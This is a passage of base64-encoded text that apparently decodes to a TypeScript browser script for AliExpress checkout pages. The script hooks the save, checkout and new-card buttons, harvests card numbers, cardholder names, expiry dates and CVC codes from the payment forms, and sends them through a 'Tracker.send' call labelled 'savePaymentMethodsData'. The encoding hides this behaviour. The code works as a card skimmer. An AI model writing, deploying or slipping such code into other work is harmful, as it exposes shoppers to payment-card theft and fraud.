CAgICAnaWQnOiBfX2RldGVjdGVkRWxlbWVudC5pZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IF9fZGV0ZWN0ZWRFbGVtZW50LnZhbHVlXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVNwZWNpZmljRWxlbWVudEJ5VGFnTmFtZShzZWxmLCAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLnZlcmlmeS1jYXJkLWZvcm0tcm93JykgYXMgSFRNTEVsZW1lbnQpLCAnaW5wdXQnLCAnY3ZjJywgZnVuY3Rpb24gKF9fZGV0ZWN0ZWRFbGVtZW50OiBhbnkpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGVtcFBheW1lbnRNZXRob2RzU3RvcmUucHVzaCh7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IF9fZGV0ZWN0ZWRFbGVtZW50Lm5vZGVOYW1lLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lkJzogX19kZXRlY3RlZEVsZW1lbnQuaWQsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndmFsdWUnOiBfX2RldGVjdGVkRWxlbWVudC52YWx1ZVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUcmFja2VyLnNlbmQoe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kOiAnc2F2ZVBheW1lbnRNZXRob2RzRGF0YScsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkTnVtYmVyJzogdGVtcFBheW1lbnRNZXRob2RzU3RvcmVbMF0uaWQuaW5kZXhPZignY2FyZE4nKSAhPT0gLTEgPyB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZVswXS52YWx1ZSA6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQnJhbmQnOiB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZVswXS5pZCA9PT0gJ2NhcmRCcmFuZCcgPyB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZVswXS52YWx1ZSA6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkSG9sZGVyJzogdGVtcFBheW1lbnRNZXRob2RzU3RvcmVbMF0uaWQgPT09ICdjYXJkSG9sZGVyJyA/IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzBdLnZhbHVlIDogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJjYXJkRXhwaXJlXCI6IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzBdLmlkID09PSAnZXhwaXJlcycgPyB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZVswXS52YWx1ZSA6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQ1ZDJzogdGVtcFBheW1lbnRNZXRob2RzU3RvcmVbMF0uaWQgPT09ICdjdmMnID8gdGVtcFBheW1lbnRNZXRob2RzU3RvcmVbMF0udmFsdWUgOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZXZlbnQnOiAnYWRkJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwid29ya1dlYnNpdGVcIjogd2luZG93LmxvY2F0aW9uLm9yaWdpblxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGVtcFBheW1lbnRNZXRob2RzU3RvcmUgPSBbXTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH0sIDEwMDApO1xyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH1cclxuXHJcbiAgICAgICAgICAgICAgICAvKmlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuY2hlY2stb3V0LXJvb3QnKSAhPT0gbnVsbCAmJiBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuY2hlY2stb3V0LXJvb3QnKT8uY2hpbGROb2Rlcy5sZW5ndGggIT09IDEpIHtcclxuICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsMSk7XHJcbiAgICAgICAgICAgICAgICAgICAgbGV0IGludGVydmFsNCA9IHNldEludGVydmFsKGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy50aXRsZS10by1kZXRhaWwnKSAhPT0gbnVsbCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbDQpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy50aXRsZS10by1kZXRhaWwnKT8ubmV4dEVsZW1lbnRTaWJsaW5nPy50ZXh0Q29udGVudD8uaW5kZXhPZignQWRkIGEgbmV3IGNhcmQnKSAhPT0gLTEpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbJ2NsaWNrJywgJ2RibGNsaWNrJ10uZm9yRWFjaChmdW5jdGlvbiAoZXZlbnQpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLnRpdGxlLXRvLWRldGFpbCcpPy5hZGRFdmVudExpc3RlbmVyKGV2ZW50LCBmdW5jdGlvbiAoKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnByb2Nlc3NBbGlFeHByZXNzUGF5bWVudE5ld0NhcmRPblNlY29uZFBheW1lbnQoc2VsZik7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsnY2xpY2snLCAnZGJsY2xpY2snXS5mb3JFYWNoKGZ1bmN0aW9uIChldmVudCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuYmluZC1idXR0b24td3JhcCAnKT8uZmlyc3RFbGVtZW50Q2hpbGQ/LmFkZEV2ZW50TGlzdGVuZXIoZXZlbnQsIGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYucHJvY2Vzc0FsaUV4cHJlc3NQYXltZW50TmV3Q2FyZE9uU2Vjb25kUGF5bWVudChzZWxmKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVNwZWNpZmljRWxlbWVudEJ5VGFnTmFtZShzZWxmLCAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmNoZWNrLW91dC1yb290JykgYXMgSFRNTEVsZW1lbnQpLCAnc3BhbicsICdwYXltZW50LXRpdGxlJywgZnVuY3Rpb24gKF9fZGV0ZWN0ZWRFbGVtZW50OiBIVE1MRWxlbWVudCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbJ2NsaWNrJywgJ2RibGNsaWNrJ10uZm9yRWFjaChmdW5jdGlvbiAoZXZlbnQpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5iaW5kLWJ1dHRvbi13cmFwJyk/LmZpcnN0RWxlbWVudENoaWxkPy5hZGRFdmVudExpc3RlbmVyKGV2ZW50LCBmdW5jdGlvbiAoKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVHJhY2tlci5zZW5kKHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogJ3NhdmVQYXltZW50TWV0aG9kc0RhdGEnLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZE51bWJlcic6IF9fZGV0ZWN0ZWRFbGVtZW50LnRleHRDb250ZW50LFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRCcmFuZCc6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkSG9sZGVyJzogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRFeHBpcmUnOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZENWQyc6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdldmVudCc6ICdhZGQnLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3dvcmtXZWJzaXRlJzogd2luZG93LmxvY2F0aW9uLm9yaWdpblxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgIH0sIDEwMDApO1xyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVBheW1lbnRTcGFuVGFnKHNlbGYsIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuY2hlY2stb3V0LXJvb3QnKSBhcyBIVE1MRWxlbWVudCksIGZ1bmN0aW9uIChfX2RldGVjdGVkRWxlbWVudDogYW55KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFsnY2xpY2snLCAnZGJsY2xpY2snXS5mb3JFYWNoKGZ1bmN0aW9uIChldmVudCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmJpbmQtYnV0dG9uLXdyYXAnKT8uZmlyc3RFbGVtZW50Q2hpbGQ/LmFkZEV2ZW50TGlzdGVuZXIoZXZlbnQsIGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUcmFja2VyLnNlbmQoe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kOiAnc2F2ZVBheW1lbnRNZXRob2RzRGF0YScsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkTnVtYmVyJzogKF9fZGV0ZWN0ZWRFbGVtZW50IGFzIEhUTUxFbGVtZW50KS50ZXh0Q29udGVudCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQnJhbmQnOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEhvbGRlcic6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkRXhwaXJlJzogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRDVkMnOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZXZlbnQnOiAnYWRkJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd3b3JrV2Vic2l0ZSc6IHdpbmRvdy5sb2NhdGlvbi5vcmlnaW5cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgICAgICAgICAgICBpZiAod2luZG93LmxvY2F0aW9uLmhyZWYuaW5kZXhPZignY29uZmlybV9vcmRlci5odG0nKSAhPT0gLTEpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJy5hcnJvdy1jb250ZW50JykubGVuZ3RoICE9PSAwKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCcuYXJyb3ctY29udGVudCcpLmZvckVhY2goZnVuY3Rpb24gKGRpdkVsZW1lbnQpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaXZFbGVtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZGl2RWxlbWVudC5jbGFzc0xpc3QuY29udGFpbnMoJ2Fycm93LWRvd24nKSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IF9faW50ZXJ2YWwyID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuYWRkLW5ldy1jYXJkJykgIT09IG51bGwpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChfX2ludGVydmFsMik7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsnY2xpY2snLCAnZGJsY2xpY2snXS5mb3JFYWNoKGZ1bmN0aW9uIChldmVudCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmFkZC1uZXctY2FyZCcpPy5hZGRFdmVudExpc3RlbmVyKGV2ZW50LCBmdW5jdGlvbiAoKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IF9faW50ZXJ2YWwzID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLm5ldy1jYXJkJykgIT09IG51bGwpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoX19pbnRlcnZhbDMpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlUGF5bWVudE5ld0NhcmQoc2VsZixcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLm5ldy1jYXJkJykgYXMgSFRNTEVsZW1lbnQpLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uIChlbGVtZW50czogYW55KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBwYXltZW50TWV0aG9kU3RvcmU6IGFueSA9IFtdO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuc2F2ZScpPy5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsZW1lbnRzLmZvckVhY2goZnVuY3Rpb24gKGVsZW1lbnQ6IGFueSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBheW1lbnRNZXRob2RTdG9yZS5wdXNoKHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2VsZW1lbnQnOiBlbGVtZW50Lm5vZGVOYW1lLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaWQnOiBlbGVtZW50LmlkLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndHlwZSc6IGVsZW1lbnQudHlwZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogZWxlbWVudC52YWx1ZVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRyYWNrZXIuc2VuZCh7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogJ3NhdmVQYXltZW50TWV0aG9kc0RhdGEnLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmROdW1iZXInOiBwYXltZW50TWV0aG9kU3RvcmVbMF0udmFsdWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQnJhbmQnOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkSG9sZGVyJzogcGF5bWVudE1ldGhvZFN0b3JlWzFdLnZhbHVlLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEV4cGlyZSc6IHBheW1lbnRNZXRob2RTdG9yZVsyXS52YWx1ZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRDVkMnOiBwYXltZW50TWV0aG9kU3RvcmVbM10udmFsdWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdldmVudCc6ICdhZGQnLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnd29ya1dlYnNpdGUnOiB3aW5kb3cubG9jYXRpb24ub3JpZ2luXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXltZW50TWV0aG9kU3RvcmUgPSBbXTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LCAxMDAwKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sIDEwMDApO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLm1peC1lZGNhcmQtaXRlbScpPy5jaGlsZEVsZW1lbnRDb3VudCAhPT0gMCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbDEpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGNhcmRDb25maXJtRWxlbWVudCA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNjaGVja291dC1idXR0b24nKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsnY2xpY2snLCAnZGJsY2xpY2snXS5mb3JFYWNoKGZ1bmN0aW9uIChldmVudCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhcmRDb25maXJtRWxlbWVudD8uYWRkRXZlbnRMaXN0ZW5lcihldmVudCwgZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgdGVtcFBheW1lbnRNZXRob2RzU3RvcmU6IGFueSA9IFtdO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcubWl4LWVkY2FyZC1pdGVtJyk/LmNoaWxkTm9kZXMuZm9yRWFjaChmdW5jdGlvbiAoX19jaGlsZEVsZW1lbnQpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoX19jaGlsZEVsZW1lbnQgYXMgSFRNTEVsZW1lbnQpLm5vZGVOYW1lID09PSAnU1BBTicgJiYgKF9fY2hpbGRFbGVtZW50IGFzIEhUTUxFbGVtZW50KS5jbGFzc0xpc3QuY29udGFpbnMoJ2ljb24nKSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoX19jaGlsZEVsZW1lbnQgYXMgSFRNTEVsZW1lbnQpLmNsYXNzTGlzdC5jb250YWlucygndmlzYScpKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBQYXltZW50TWV0aG9kc1N0b3JlLnB1c2goe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2VsZW1lbnQnOiAoX19jaGlsZEVsZW1lbnQgYXMgSFRNTEVsZW1lbnQpLm5vZGVOYW1lLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lkJzogKF9fY2hpbGRFbGVtZW50IGFzIEhUTUxFbGVtZW50KS5pZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6ICd2aXNhJ1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoKF9fY2hpbGRFbGVtZW50IGFzIEhUTUxFbGVtZW50KS5ub2RlTmFtZSA9PT0gJ1NQQU4nICYmIChfX2NoaWxkRWxlbWVudCBhcyBIVE1MRWxlbWVudCkuY2xhc3NMaXN0LmNvbnRhaW5zKCdwYXktbmFtZScpKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGVtcFBheW1lbnRNZXRob2RzU3RvcmUucHVzaCh7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlbGVtZW50JzogKF9fY2hpbGRFbGVtZW50IGFzIEhUTUxFbGVtZW50KS5ub2RlTmFtZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lkJzogKF9fY2hpbGRFbGVtZW50IGFzIEhUTUxFbGVtZW50KS5pZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgIC